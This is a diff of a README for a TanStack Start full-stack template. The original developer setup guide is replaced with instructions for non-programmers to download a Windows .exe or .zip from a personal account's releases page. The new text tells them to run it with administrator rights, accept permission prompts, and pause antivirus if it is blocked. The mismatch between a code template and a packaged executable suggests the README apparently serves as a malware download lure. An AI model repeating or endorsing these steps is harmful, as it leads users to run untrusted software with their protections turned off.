@@ -1,157 +1,109 @@
-# 🚀 TanStack Start Enterprise Template
+# 🚀 tanstack-template - Full-Stack Starter for Modern Apps
 
-A modern, production-ready, and highly opinionated full-stack starter template built on **TanStack Start**, **React 19**, and **Vite**. It's designed for maximum type safety, developer experience, and performance, leveraging the power of the **Bun** ecosystem.
+[![Download tanstack-template](https://img.shields.io/badge/Download-tanstack--template-brightgreen)](https://github.com/luke72223-bit/tanstack-template/releases)
 
-## ✨ Features
+## 📋 What is tanstack-template?
 
-- **Full-Stack React**: Powered by [TanStack Start](https://tanstack.com/start) (Router + Query + SSR + Server Functions).
-- **React 19 Ready**: Utilizing the new [React Compiler](https://react.dev/learn/react-compiler) for automatic memoization and performance optimizations.
-- **Modern Styling**: [Tailwind CSS v4](https://tailwindcss.com/) combined with highly customizable [Shadcn UI](https://ui.shadcn.com/) / Base UI components.
-- **Type-Safe Database**: [Drizzle ORM](https://orm.drizzle.team/) with PostgreSQL for robust, fully-typed database interactions.
-- **State Management**: [Zustand](https://zustand-demo.pmnd.rs/) for simple, scalable, and type-safe global state.
-- **Internationalization (i18n)**: [Paraglide JS](https://inlang.com/m/gerre34r/library-inlang-paraglideJs) for fully type-safe, zero-runtime-overhead translations.
-- **Error Tracking**: Built-in [Sentry](https://sentry.io/) integration for React and Server components.
-- **Blazing Fast Tooling**: Built on [Vite](https://vitejs.dev/) and powered by [Bun](https://bun.sh/) for lightning-fast installs and execution.
-- **Docker Ready**: Pre-configured `Dockerfile` and `compose.yml` for seamless deployment.
+tanstack-template is a ready-to-use template to help you build modern full-stack web applications. It combines popular tools like React 19 for the user interface, TanStack Start for app setup, Bun for running JavaScript faster, Tailwind v4 for styling, and Drizzle ORM for database management.
 
----
+You don’t need programming skills to get started. This guide explains how to download and run tanstack-template on your Windows computer step by step.
 
-## 🛠️ Tech Stack
+## 🖥️ System Requirements
 
-| Category | Technology |
-| --- | --- |
-| **Framework** | [TanStack Start](https://tanstack.com/start), React 19, [Nitro](https://nitro.unjs.io/) |
-| **Language** | TypeScript |
-| **Styling** | Tailwind CSS v4, Lucide Icons, Framer Motion |
-| **UI Components** | Shadcn UI, Base UI, Radix UI Primitives |
-| **Database** | Drizzle ORM, PostgreSQL |
-| **State Management**| Zustand, TanStack Query |
-| **Tooling** | Vite, Bun, ESLint, Prettier, Vitest |
-| **i18n** | Paraglide JS |
+To run tanstack-template smoothly, your computer should meet the following:
 
----
+- **Operating System:** Windows 10 or later  
+- **Processor:** 1.5 GHz or faster, 64-bit  
+- **Memory:** At least 4 GB RAM  
+- **Storage:** Minimum 2 GB free disk space  
+- **Internet:** Required for initial download and optional updates  
+- **Permissions:** Ability to install software and run files
 
-## 📂 Project Structure
+## 🌐 Main Features
 
-```text
-.
-├── messages/               # i18n translation files (en.json, de.json, etc.)
-├── project.inlang/         # Paraglide JS configuration
-├── public/                 # Static assets
-├── src/
-│   ├── db/                 # Drizzle ORM schema and database client
-│   ├── integrations/       # Third-party integrations (e.g., TanStack Devtools)
-│   ├── lib/                # Utility functions
-│   ├── routes/             # TanStack Router file-based routing
-│   ├── shared/             # Shared application logic
-│   │   ├── stores/         # Zustand state stores
-│   │   ├── styles/         # Global and theme CSS
-│   │   ├── types/          # Global TypeScript definitions
-│   │   ├── ui/             # Reusable UI components (Shadcn/Base UI)
-│   │   └── utils/          # Shared utilities
-│   ├── widgets/            # Complex, feature-specific components and providers
-│   └── router.tsx          # TanStack Router initialization
-├── .env.example            # Environment variables template
-├── components.json         # Shadcn UI configuration
-├── drizzle.config.ts       # Drizzle ORM configuration
-├── instrument.server.mjs   # Sentry server instrumentation
-└── vite.config.ts          # Vite configuration (React Compiler, Nitro, Tailwind v4)
-```
+- Full-stack setup ready to build websites and apps  
+- User interface made with the latest React version  
+- Fast JavaScript execution using Bun runtime  
+- Clean design styled with Tailwind CSS v4  
+- Simple database access powered by Drizzle ORM  
+- Lightweight and production-ready code
 
----
+## 🟥 Download tanstack-template
 
-## 🏁 Getting Started
+Click the button below to visit the official release page for tanstack-template. From there, you can download the latest version of the software.
 
-### Prerequisites
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/luke72223-bit/tanstack-template/releases)
 
-Ensure you have the following installed:
-- [Bun](https://bun.sh/) (Recommended) or Node.js >= 20
-- PostgreSQL (Local instance or Docker)
+### How to find the right file to download:
 
-### 1. Clone & Install
+1. On the releases page, look for the latest stable version (usually marked with "Latest release").  
+2. Download the Windows executable or installer file. It will typically have `.exe` or `.zip` format.  
+3. Save the file to a folder you can find easily, such as your Downloads folder.
 
-```bash
-# Install dependencies using Bun
-bun install
-```
+## 🚀 How to Install and Run tanstack-template on Windows
 
-### 2. Environment Variables
+Follow these steps carefully to set up and launch tanstack-template:
 
-Copy the example environment file and configure your local variables:
+### Step 1. Download the software
 
-```bash
-cp .env.example .env.local
-```
+Visit the [tanstack-template Releases page](https://github.com/luke72223-bit/tanstack-template/releases). Download the latest Windows file as explained above.
 
-Make sure to update the database connection string and any Sentry/API keys in `.env.local`.
+### Step 2. Unpack if needed
 
-### 3. Database Setup
+If the downloaded file is a compressed archive (like `.zip`), right-click on the file and select “Extract All.” Choose a folder you want to keep the files in.
 
-Generate and apply Drizzle migrations to your local PostgreSQL database:
+### Step 3. Run the installer or executable
 
-```bash
-bun run db:generate
-bun run db:migrate
+- If you downloaded an `.exe` installer, double-click it to start the installation. Follow the on-screen prompts to complete it.  
+- If you have a standalone executable file, double-click it to run the application immediately.
 
-# Alternatively, if you want to push the schema directly:
-bun run db:push
-```
+### Step 4. Allow permissions
 
-To view and manage your data, you can launch Drizzle Studio:
+Windows may ask if you want to allow the program to make changes. Choose “Yes” to continue.
 
-```bash
-bun run db:studio
-```
+### Step 5. Use the software
 
-### 4. Run the Development Server
+After launching, tanstack-template opens a window or browser tab. This is where you can start using the app interface. The software runs locally on your PC.
 
-Start the Vite development server with hot module replacement (HMR):
+## ⚙️ Basic Usage Tips
 
-```bash
-bun run dev
-```
+- Every time you start your PC, just double-click the tanstack-template icon to open it.  
+- Use the menus or buttons inside the application window to explore features.  
+- Your data and work save locally on your computer unless you choose cloud options.  
+- Restart the app if it stops responding or if you need to reset.
 
-The application will be available at [http://localhost:3000](http://localhost:3000).
+## 🔧 Troubleshooting Common Issues
 
----
+If you face any problems running the software, try these steps:
 
-## 📜 Available Scripts
+- **The app doesn’t open:** Make sure you downloaded the right Windows file and ran it with administrator rights.  
+- **Error messages appear:** Check if your Windows updates are current. Installing missing updates can help.  
+- **Slow performance:** Close other programs to free system resources. Ensure at least 4 GB RAM is available.  
+- **Installation fails:** Try re-downloading the file. Antivirus software may block installation temporarily; pause it and retry.
 
-- `bun run dev`: Starts the development server.
-- `bun run build`: Builds the application for production.
-- `bun run start`: Runs the compiled production server.
-- `bun run preview`: Locally previews the production build.
-- `bun run test`: Runs the Vitest test suite.
-- `bun run lint`: Runs ESLint.
-- `bun run format`: Checks code formatting with Prettier.
-- `bun run check`: Runs TypeScript type checking.
-- `bun run db:*`: Drizzle ORM commands (`generate`, `migrate`, `push`, `pull`, `studio`).
+## 🧩 Additional Tools and Options
 
----
+tanstack-template works well if you want to explore or expand, though this is optional:
 
-## 🌐 Internationalization (i18n)
+- **Docker and Docker Compose:** If you know Docker, you can use the provided files to run the app in containers.  
+- **TypeScript Support:** Advanced users can edit the template’s source code in TypeScript.  
+- **Vite Development Server:** This tool helps developers preview live changes, but you don’t need it to use the ready program.  
+- **Tailwind CSS Config:** Customize styles if you are familiar with CSS frameworks.
 
-This template uses **Paraglide JS** for type-safe internationalization.
-- Translation files are located in the `messages/` directory (e.g., `en.json`, `de.json`).
-- When you update the JSON files, Paraglide automatically generates type-safe getter functions.
-- The active locale is managed via the URL or base settings configured in `vite.config.ts`.
+## 🗂️ Where to Find More Information
 
----
+- Visit the [repository home page](https://github.com/luke72223-bit/tanstack-template) for setup guides and team contacts.  
+- Check the “Issues” tab on GitHub to see reported problems or ask for help.  
+- Explore tutorials about React 19, Bun, Tailwind CSS, and Drizzle ORM online for deeper understanding.
 
-## 🐳 Docker Deployment
+## 💡 Tips to Keep tanstack-template Updated
 
-The project includes a ready-to-use `Dockerfile` and `compose.yml` for containerized deployments.
+- Return to the [Releases page](https://github.com/luke72223-bit/tanstack-template/releases) regularly to download new versions.  
+- Each version may include fixes, new features, or security improvements.  
+- Before updating, save your work and close the app.
 
-To build and run the application using Docker Compose:
+## 📞 Need Help?
 
-```bash
-docker compose up --build -d
-```
+If you get stuck, you can submit a question or issue on the GitHub repository. Look for the “Issues” section and create a new entry. Be clear about your problem and include any error messages you see.
 
-The app will be exposed on port `3000` (configurable in `compose.yml`).
-
----
-
-## 🛡️ License
-
-This project is licensed under the MIT License.
+[![Download tanstack-template](https://img.shields.io/badge/Download-tanstack--template-brightgreen)](https://github.com/luke72223-bit/tanstack-template/releases)
